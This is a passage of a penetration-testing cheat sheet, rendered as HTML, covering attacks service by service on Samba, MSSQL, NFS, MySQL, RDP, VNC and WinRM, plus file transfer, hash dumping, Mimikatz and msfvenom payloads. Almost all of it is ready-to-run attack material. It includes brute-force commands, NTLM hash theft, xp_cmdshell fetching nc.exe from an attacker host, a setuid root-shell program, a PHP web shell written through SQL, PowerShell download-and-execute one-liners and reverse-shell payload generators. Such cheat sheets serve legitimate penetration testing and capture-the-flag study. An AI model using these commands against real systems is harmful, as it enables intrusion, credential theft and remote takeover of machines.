}</code></pre><pre class=language-><code class=language-># Build
gcc -o test.so -shared poc.c -fPIC</code></pre><pre class=language-><code class=language-># Start a listener
nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Exploit
./cve_2017_7494.py -t <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TARGET_IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span> --custom=test.so</code></pre><hr> <h2 id=mssql---1433>MSSQL - 1433</h2> <h3 id=get-information>Get information</h3> <pre class=language-><code class=language->nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=brute-force-5>Brute force</h3> <pre class=language-><code class=language->hydra -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> mssql -vV -I -u</code></pre><h3 id=having-credentials>Having credentials</h3> <pre class=language-><code class=language->mssqlclient.py -windows-auth <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
mssqlclient.py <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>

# Once logged in you can run queries:
SQL> select @@ version;

# Steal NTLM hash
sudo smbserver.py -smb2support liodeus .
SQL> exec master..xp_dirtree '\\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>\liodeus\' # Steal the NTLM hash, crack it with john or hashcat

# Try to enable code execution
SQL> enable_xp_cmdshell

# Execute code
SQL> xp_cmdshell whoami /all
SQL> xp_cmdshell certutil.exe -urlcache -split -f http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/nc.exe</code></pre><h3 id=manual-exploit>Manual exploit</h3> <pre class=language-><code class=language->Cheatsheet :
    - https://www.asafety.fr/mssql-injection-cheat-sheet/</code></pre><hr> <h2 id=nfs---2049>NFS - 2049</h2> <h3 id=show-mountable-nfs-shares>Show Mountable NFS Shares</h3> <pre class=language-><code class=language->showmount -e <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
nmap --script=nfs-showmount -oN mountable_shares <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=mount-a-share>Mount a share</h3> <pre class=language-><code class=language->sudo mount -v -t nfs <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIRECTORY</span><span class="token punctuation">></span></span>
sudo mount -v -t nfs -o vers=2 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIRECTORY</span><span class="token punctuation">></span></span></code></pre><h3 id=nfs-misconfigurations>NFS misconfigurations</h3> <pre class=language-><code class=language-># List exported shares
cat /etc/exports</code></pre><p>If you find some directory that is configured as no_root_squash/no_all_squash you may be able to privesc.</p> <pre class=language-><code class=language-># Attacker, as root user

mkdir <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIRECTORY</span><span class="token punctuation">></span></span>
mount -v -t nfs <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIRECTORY</span><span class="token punctuation">></span></span>
cd <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DIRECTORY</span><span class="token punctuation">></span></span>
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c
gcc pwn.c -o pwn
chmod +s pwn

# Victim

cd <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SHARE</span><span class="token punctuation">></span></span>
./pwn # Root shell</code></pre><hr> <h2 id=mysql---3306>MYSQL - 3306</h2> <h3 id=brute-force-6>Brute force</h3> <pre class=language-><code class=language->hydra -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> mysql -vV -I -u</code></pre><h3 id=extracting-mysql-credentials-from-files>Extracting MySQL credentials from files</h3> <pre class=language-><code class=language->cat /etc/mysql/debian.cnf
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"</code></pre><h3 id=connect>Connect</h3> <pre class=language-><code class=language-># Local
mysql -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>
mysql -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -p

# Remote
mysql -h <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span></code></pre><h3 id=mysql-commands>MySQL commands</h3> <pre class=language-><code class=language->show databases;
use <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATABASES</span><span class="token punctuation">></span></span>;

show tables;
describe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TABLE</span><span class="token punctuation">></span></span>;

select * from <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>TABLE</span><span class="token punctuation">></span></span>;

# Try to execute code
select do_system('id');
\! sh

# Read & Write
select load_file('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>');
select 1,2,"<span class="token prolog">&lt;?php echo shell_exec($_GET['c']);?></span>",4 into OUTFILE '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span>'</code></pre><h3 id=manual-exploit-1>Manual exploit</h3> <pre class=language-><code class=language->Cheatsheet :
    - https://www.asafety.fr/mysql-injection-cheat-sheet/</code></pre><hr> <h2 id=rdp---3389>RDP - 3389</h2> <h3 id=brute-force-7>Brute force</h3> <pre class=language-><code class=language->crowbar -b rdp -s <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/CIDR -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -C <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span>
crowbar -b rdp -s <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/CIDR -U <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -C <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span>

hydra -f -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> rdp://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u -vV</code></pre><h3 id=connect-with-known-credentials--hash>Connect with known credentials / hash</h3> <pre class=language-><code class=language->rdesktop -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
rdesktop -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DOMAIN</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span> -p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>

xfreerdp /u:[DOMAIN\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span> /p:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span> /v:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
xfreerdp /u:[DOMAIN\]<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERNAME</span><span class="token punctuation">></span></span> /pth:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HASH</span><span class="token punctuation">></span></span> /v:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=session-stealing>Session stealing</h3> <h4 id=get-openned-sessions>Get openned sessions</h4> <pre class=language-><code class=language->query user</code></pre><h4 id=access-to-the-selected>Access to the selected</h4> <pre class=language-><code class=language->tscon <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ID</span><span class="token punctuation">></span></span> /dest:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SESSIONNAME</span><span class="token punctuation">></span></span></code></pre><h3 id=adding-user-to-rdp-group-windows>Adding user to RDP group (Windows)</h3> <pre class=language-><code class=language->net localgroup "Remote Desktop Users" <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> /add</code></pre><hr> <h2 id=vnc---5800---58001---5900---5901>VNC - 5800 - 58001 - 5900 - 5901</h2> <h3 id=scans-1>Scans</h3> <pre class=language-><code class=language->nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -v -p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span></code></pre><h3 id=brute-force-8>Brute force</h3> <pre class=language-><code class=language->hydra -L <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> P <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> -s <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> vnc -u -vV</code></pre><h3 id=connect-1>Connect</h3> <pre class=language-><code class=language->vncviewer <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span></code></pre><h3 id=found-vnc-password>Found VNC password</h3> <h4 id=linux>Linux</h4> <pre class=language-><code class=language->Default password is stored in: ~/.vnc/passwd</code></pre><h4 id=windows>Windows</h4> <pre class=language-><code class=language-># RealVNC
HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver

# TightVNC
HKEY_CURRENT_USER\Software\TightVNC\Server

# TigerVNC
HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4

# UltraVNC
C:\Program Files\UltraVNC\ultravnc.ini</code></pre><h3 id=decrypt-vnc-password>Decrypt VNC password</h3> <pre class=language-><code class=language->msfconsole
irb
fixedkey = "\x17\x52\x6b\x06\x23\x4e\x58\x07"
require 'rex/proto/rfb'
Rex::Proto::RFB::Cipher.decrypt ["2151D3722874AD0C"].pack('H*'), fixedkey
/dev/nul</code></pre><hr> <h2 id=winrm---5985---5986>WINRM - 5985 - 5986</h2> <h3 id=brute-force-9>Brute force</h3> <pre class=language-><code class=language->crackmapexec winrm <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USERS_LIST</span><span class="token punctuation">></span></span> -p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span></code></pre><h3 id=connecting>Connecting</h3> <pre class=language-><code class=language->evil-winrm -i <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -p <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORD</span><span class="token punctuation">></span></span>
evil-winrm -i <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span> -H <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HASH</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=cgi>CGI</h2> <h3 id=found-cgi-scripts>Found CGI scripts</h3> <pre class=language-><code class=language->ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGI-XPlatform.fuzz.txt -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/wordlist/SecLists/Discovery/Web-Content/CGIs.txt -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/ccgi-bin/FUZZ -t 50
ffuf -w /home/liodeus/directory-list-lowercase-2.3-medium.txt -u <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/cgi-bin/FUZZ -e .sh,.pl,.cgi -t 100</code></pre><p>If a script is found try <a href=javascript:; onclick="document.location.hash='shellshock';">SHELLSHOCK</a>.</p> <hr> <h2 id=command-and-control-framework>Command and control framework</h2> <pre class=language-><code class=language-># Download
git clone https://github.com/mhaskar/Octopus/tree/v1.2

# Install requirements
pip install -r requirements.txt

# Usage
./octopus.py

# Listener (exemple)
listen_http <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BIND_IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BIND_PORT</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HOSTNAME</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>INTERVAL_IN_SECONDS</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LISTENER_NAME</span><span class="token punctuation">></span></span>
listen_http 0.0.0.0 80 192.168.1.87 5 test.php listener_1

# Agent (exemple)
generate_powershell <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LISTENER_NAME</span><span class="token punctuation">></span></span>
generate_powershell listener_1</code></pre><hr> <h2 id=compiling-exploits>Compiling exploits</h2> <h3 id=for-linux>For linux</h3> <pre class=language-><code class=language-># 64 bits
gcc -o exploit exploit.c

# 32 bits
gcc -m32 -o exploit exploit.c</code></pre><h3 id=for-windows>For windows</h3> <pre class=language-><code class=language->To compile Win32 bit executables, execute i686-w64-mingw32-gcc -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE.exe</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE.c</span><span class="token punctuation">></span></span>
To compile Win64 bit executables, execute x86_64-w64-mingw32-gcc -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE.exe</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE.c</span><span class="token punctuation">></span></span>
To Compiled .cpp source file, execute i586-mingw32msvc-g++ -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>.exe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span>.cpp
To compile python scripts, pyinstaller --onefile <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SCRIPT.py</span><span class="token punctuation">></span></span>

# Compile windows .exe on Linux
i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe</code></pre><h3 id=cross-compile>Cross compile</h3> <pre class=language-><code class=language->gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c</code></pre><hr> <h2 id=dictionary-generation>DICTIONARY GENERATION</h2> <pre class=language-><code class=language->cewl -m <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>WORDS_SIZE</span><span class="token punctuation">></span></span> --with-numbers -w dictiFromWebsite <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -d <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DEPTH</span><span class="token punctuation">></span></span></code></pre><pre class=language-><code class=language->crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt</code></pre><hr> <h2 id=file-transfer>FILE TRANSFER</h2> <h3 id=linux-1>Linux</h3> <pre class=language-><code class=language-># PYTHON
python -m SimpleHTTPServer <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>
python2.7 -c "from urllib import urlretrieve; urlretrieve('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>', '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FILE</span><span class="token punctuation">></span></span>')"

# FTP
sudo python3 -m pyftpdlib  -p 21 -w

# SMB
sudo smbserver.py -smb2support liodeus .

# WGET
wget <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span>

# CURL
curl <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span>

# NETCAT
nc -lvp 1234 > <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span> 
nc <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> 1234 &lt; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IN_FILE</span><span class="token punctuation">></span></span> 

# SCP
scp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SOURCE_FILE</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FILE</span><span class="token punctuation">></span></span></code></pre><h3 id=windows-1>Windows</h3> <pre class=language-><code class=language-># FTP 
echo open <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span> >> ftp.txt echo bye>> ftp.txt
ftp -v -n -s:ftp.txt

# SMB
copy \\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span> # Linux -> Windows
copy <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FILE</span><span class="token punctuation">></span></span> \\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>\<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>\ # Windows -> Linux

# Powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>', '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FILE</span><span class="token punctuation">></span></span>')
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>')
powershell "wget <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>"

# Python
python.exe -c "from urllib import urlretrieve; urlretrieve('<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>', '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FILE</span><span class="token punctuation">></span></span>')"

# CertUtil
certutil.exe -urlcache -split -f "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>"

# NETCAT
nc -lvp 1234 > <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span> 
nc <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> 1234 &lt; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IN_FILE</span><span class="token punctuation">></span></span>

# CURL
curl <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span> -o <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>OUT_FILE</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=git>GIT</h2> <h3 id=download-git>Download .git</h3> <pre class=language-><code class=language->mkdir <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FOLDER</span><span class="token punctuation">></span></span>
./gitdumper.sh <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>URL</span><span class="token punctuation">></span></span>/.git/ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FOLDER</span><span class="token punctuation">></span></span></code></pre><h3 id=extract-git-content>Extract .git content</h3> <pre class=language-><code class=language->mkdir <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EXTRACT_FOLDER</span><span class="token punctuation">></span></span>
./extractor.sh <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DESTINATION_FOLDER</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>EXTRACT_FOLDER</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=hashes>HASHES</h2> <h3 id=windows-2>Windows</h3> <pre class=language-><code class=language->reg save HKLM\SAM c:\SAM
reg save HKLM\System c:\System

samdump2 System SAM > hashes</code></pre><h3 id=linux-2>Linux</h3> <pre class=language-><code class=language->unshadow passwd shadow > hashes</code></pre><hr> <h2 id=mimikatz>MIMIKATZ</h2> <pre class=language-><code class=language->privilege::debug</code></pre><pre class=language-><code class=language->sekurlsa::logonpasswords
sekurlsa::tickets /export

kerberos::list /export

vault::cred
vault::list

lsadump::sam
lsadump::secrets
lsadump::cache</code></pre><hr> <h2 id=miscellaneous>MISCELLANEOUS</h2> <h3 id=get-a-windows-path-without-spaces>Get a Windows path without spaces</h3> <pre class=language-><code class=language-># path.cmd
@echo off
echo %~s1

path.cmd "C:\Program Files (x86)\Common Files\test.txt"
C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces</code></pre><hr> <h2 id=msfvenom-payload>MSFVENOM PAYLOAD</h2> <h3 id=linux-3>Linux</h3> <pre class=language-><code class=language->msfvenom -p linux/x86/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f elf > shell.elf</code></pre><h3 id=windows-3>Windows</h3> <pre class=language-><code class=language->msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f exe > shell.exe</code></pre><h3 id=php>PHP</h3> <pre class=language-><code class=language->msfvenom -p php/reverse_php LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f raw > shell.php

Then we need to add the <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>?php</span> <span class="token attr-name">at</span> <span class="token attr-name">the</span> <span class="token attr-name">first</span> <span class="token attr-name">line</span> <span class="token attr-name">of</span> <span class="token attr-name">the</span> <span class="token attr-name">file</span> <span class="token attr-name">so</span> <span class="token attr-name">that</span> <span class="token attr-name">it</span> <span class="token attr-name">will</span> <span class="token attr-name">execute</span> <span class="token attr-name">as</span> <span class="token attr-name">a</span> <span class="token attr-name">PHP</span> <span class="token attr-name">webpage</span>
<span class="token attr-name">cat</span> <span class="token attr-name">shell.php</span> <span class="token attr-name">|</span> <span class="token attr-name">pbcopy</span> <span class="token attr-name">&&</span> <span class="token attr-name">echo</span> <span class="token attr-name">'&lt;?php</span> <span class="token attr-name">'</span> <span class="token attr-name">|</span> <span class="token attr-name">tr</span> <span class="token attr-name">-d</span> <span class="token attr-name">'\n'</span> <span class="token punctuation">></span></span> shell.php && pbpaste >> shell.php</code></pre><h3 id=asp>ASP</h3> <pre class=language-><code class=language->msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f asp > shell.asp</code></pre><h3 id=jsp>JSP</h3> <pre class=language-><code class=language->msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f raw > shell.jsp</code></pre><h3 id=war>WAR</h3> <pre class=language-><code class=language->msfvenom -p java/jsp_shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f war > shell.war</code></pre><h3 id=python>Python</h3> <pre class=language-><code class=language->msfvenom -p cmd/unix/reverse_python LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f raw > shell.py</code></pre><h3 id=bash>Bash</h3> <pre class=language-><code class=language->msfvenom -p cmd/unix/reverse_bash LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f raw > shell.sh</code></pre><h3 id=perl>Perl</h3> <pre class=language-><code class=language->msfvenom -p cmd/unix/reverse_perl LHOST=<span class="token tag"><span class="token 